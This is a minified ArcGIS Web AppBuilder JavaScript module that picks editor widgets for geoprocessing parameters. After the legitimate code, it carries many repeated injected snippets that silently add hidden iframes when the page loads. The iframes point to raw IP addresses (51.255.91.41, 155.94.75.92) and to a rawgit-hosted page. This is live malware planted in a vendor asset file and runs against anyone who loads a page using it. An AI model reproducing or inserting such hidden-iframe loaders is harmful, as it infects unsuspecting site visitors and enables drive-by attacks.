// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/on dojo/aspect dijit/form/Select dijit/form/TextBox jimu/dijit/CheckBox jimu/dijit/URLInput jimu/utils ./editors/simpleEditors ./editors/FeatureSetEditorChooser ./editors/FeatureSetResultEditor ./editors/SelectFeatureSetFromUrl ./editors/SelectFeatureSetFromLayer ./editors/SelectFeatureSetFromFile ./editors/SelectFeatureSetFromDraw ./editors/DataFileEditor ./editors/RasterLayerEditor ./editors/RecordSetEditor".split(" "),function(l,n,p,q,r,t,u,v,e,w,x,y,z,A,B,C,D,E){function F(a,
d,b){return a.editorName&&0>a.dataType.indexOf("GPMultiValue")?a.editorName:"input"===d?"GPMultiValue:GPFeatureRecordSetLayer"===a.dataType?"UnsupportEditor":-1<a.dataType.indexOf("GPMultiValue")&&a.choiceList&&0<a.choiceList.length?"MultiValueChooser":-1<a.dataType.indexOf("GPMultiValue")&&(!a.choiceList||0===a.choiceList.length)?"MultiValueEditor":"GPLong"===a.dataType?"LongNumberTextBox":"GPDouble"===a.dataType?"DoubleNumberTextBox":"GPString"===a.dataType?a.choiceList&&0<a.choiceList.length?"Select":
"TextBox":"GPBoolean"===a.dataType?"CheckBox":"GPLinearUnit"===a.dataType?"LinerUnitEditor":"GPDate"===a.dataType?"DateTimeEditor":"GPDataFile"===a.dataType?"DataFileEditor":"GPRasterDataLayer"===a.dataType?"RasterLayerEditor":"GPRecordSet"===a.dataType?"SimpleJsonEditor":"GPFeatureRecordSetLayer"===a.dataType?"setting"===b?"FeatureSetEditorChooser":"draw"===a.featureSetMode?"SelectFeatureSetFromDraw":"layers"===a.featureSetMode?"SelectFeatureSetFromLayer":"url"===a.featureSetMode?"SelectFeatureSetFromUrl":
"file"===a.featureSetMode?"SelectFeatureSetFromFile":"map"===a.featureSetMode?"SelectFeatureSetFromMap":"UnsupportEditor":"UnsupportEditor":"GPFeatureRecordSetLayer"===a.dataType?"FeatureSetResultEditor":"GPRecordSet"===a.dataType?"RecordSetEditor":"MapServiceLayer"===a.dataType?"MapServiceLayer":"ShowMessage"}var g={},m,h=[],k;g.createEditor=function(a,d,b,f){var c;d=F(a,d,b);b={param:a,widgetUID:f?f.uid:void 0,config:f?f.config:void 0,appConfig:f?f.appConfig:void 0,map:m,nls:k,context:b,editorManager:g,
style:{width:"100%"}};"UnsupportEditor"===d?(b.message="type "+a.dataType+" is not supported for now.",c=new e.UnsupportEditor(b)):"ShowMessage"===d?(b.message="GPRecordSet"===a.dataType?"table":"GPDataFile"===a.dataType||"GPRasterDataLayer"===a.dataType?"link":"text",c=new e.UnsupportEditor(b)):"MapServiceLayer"===d?(b.message=k.useResultMapService,c=new e.UnsupportEditor(b)):"RecordSetEditor"===d?c=new E(b):"MultiValueChooser"===d?c=new e.MultiValueChooser(b):"MultiValueEditor"===d?c=new e.MultiValueEditor(b):
"LongNumberTextBox"===d?c=new e.LongNumberEditor(b):"DoubleNumberTextBox"===d?c=new e.DoubleNumberEditor(b):"Select"===d?(b.gEditor=new q({options:l.map(a.choiceList,function(a){return{label:a,value:a}}),value:void 0===a.defaultValue?"":a.defaultValue}),b.editorName="Select",c=new e.GeneralEditorWrapperEditor(b)):"TextBox"===d?(b.gEditor=new r({value:void 0===a.defaultValue?"":a.defaultValue}),c=new e.GeneralEditorWrapperEditor(b)):"CheckBox"===d?(b.gEditor=new t({checked:void 0===a.defaultValue?
!1:a.defaultValue}),c=new e.GeneralEditorWrapperEditor(b)):"LinerUnitEditor"===d?c=new e.LinerUnitEditor(b):"DateTimeEditor"===d?c=new e.DateTimeEditor(b):"URLInput"===d?(b.gEditor=new u({value:void 0===a.defaultValue?"":a.defaultValue}),c=new e.GeneralEditorWrapperEditor(b)):"ObjectUrlEditor"===d?(a.defaultValue&&"string"===typeof a.defaultValue&&(b.value=a.defaultValue),c=new e.ObjectUrlEditor(b)):"SimpleJsonEditor"===d?(a.defaultValue&&(b.value=a.defaultValue),c=new e.SimpleJsonEditor(b)):"DataFileEditor"===
d?(a.defaultValue&&(b.value=a.defaultValue),c=new C(b)):"RasterLayerEditor"===d?(a.defaultValue&&(b.value=a.defaultValue),c=new D(b)):"SelectFeatureSetFromMap"===d?(b.message=k.currentMapExtent,c=new e.currentExtentEditor(b)):"SelectFeatureSetFromDraw"===d?void 0===a.defaultValue?(b.message="No defaultValue property.",c=new e.UnsupportEditor(b)):(a.defaultValue&&a.defaultValue.geometryType&&(f=v.getTypeByGeometryType(a.defaultValue.geometryType),b.types=[f]),b.showClear=!0,c=new B(b)):"SelectFeatureSetFromLayer"===
d?(a.defaultValue&&(b.value=a.defaultValue),c=new z(b)):"SelectFeatureSetFromUrl"===d?(b.querySetting=a.defaultValue,c=new y(b)):"SelectFeatureSetFromFile"===d?c=new A(b):"FeatureSetEditorChooser"===d?c=new w(b):"FeatureSetResultEditor"===d?c=new x(b):"GetUrlObjectFromLayer"===d?(a.defaultValue&&(b.value=a.defaultValue),c=new e.GetUrlObjectFromLayer(b)):(b.message="wrong editorName."+d,c=new e.UnsupportEditor(b));a.editorDependParamName&&(c.dependParam=a.editorDependParamName);p.before(c,"destroy",
function(){h.splice(h.indexOf(c),1)});c.dependParam&&l.forEach(h,function(a){a.param.name===c.dependParam&&c.update(a.getValue())});"SelectFeatureSetFromLayer"===d&&n(c,"change",function(){l.forEach(h,function(b){b.dependParam===a.name&&b.update(c.getValue())})});h.push(c);return c};g.setMap=function(a){m=a};g.setNls=function(a){k=a};return g});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});